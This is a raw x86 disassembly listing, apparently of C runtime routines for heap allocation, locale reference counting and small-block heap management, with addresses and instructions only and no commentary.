  42490b:	push   0x4285a4
  424910:	call   DWORD PTR ds:0x428014
  424916:	test   eax,eax
  424918:	je     0x42492f
  42491a:	push   0x42857c
  42491f:	push   eax
  424920:	call   DWORD PTR ds:0x428018
  424926:	mov    ds:0x45cd88,eax
  42492b:	test   eax,eax
  42492d:	jne    0x424939
  42492f:	mov    eax,0x4248dd
  424934:	mov    ds:0x45cd88,eax
  424939:	and    DWORD PTR [ebp-0x4],0x0
  42493d:	push   DWORD PTR [ebp+0xc]
  424940:	push   DWORD PTR [ebp+0x8]
  424943:	call   eax
  424945:	mov    DWORD PTR [ebp-0x1c],eax
  424948:	jmp    0x42496e
  42494a:	mov    eax,DWORD PTR [ebp-0x14]
  42494d:	mov    eax,DWORD PTR [eax]
  42494f:	mov    eax,DWORD PTR [eax]
  424951:	mov    DWORD PTR [ebp-0x20],eax
  424954:	xor    eax,eax
  424956:	inc    eax
  424957:	ret    
  424958:	mov    esp,DWORD PTR [ebp-0x18]
  42495b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424962:	jne    0x42496c
  424964:	push   0x8
  424966:	call   DWORD PTR ds:0x428068
  42496c:	xor    eax,eax
  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
